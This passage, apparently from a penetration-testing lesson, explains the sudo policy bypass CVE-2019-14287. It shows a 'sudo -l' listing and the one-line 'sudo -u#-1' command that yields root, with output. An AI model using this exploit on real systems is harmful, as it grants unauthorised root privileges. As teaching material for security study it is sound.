### Sudo Policy Bypass
Another vulnerability was found in 2019 that affected all versions below `1.8.28`, which allowed privileges to escalate even with a simple command. This vulnerability has the [CVE-2019-14287](https://www.sudo.ws/security/advisories/minus_1_uid/) and requires only a single prerequisite. It had to allow a user in the `/etc/sudoers` file to execute a specific command.

cry0l1t3@nix02:~$ sudo -l
[sudo] password for cry0l1t3: **********

User cry0l1t3 may run the following commands on Penny:
    ALL=(ALL) /usr/bin/id
```

Run bypass with command shown in `sudo -l`
```shell-session
cry0l1t3@nix02:~$ sudo -u#-1 id

root@nix02:/home/cry0l1t3# id

uid=0(root) gid=1005(cry0l1t3) groups=1005(cry0l1t3)
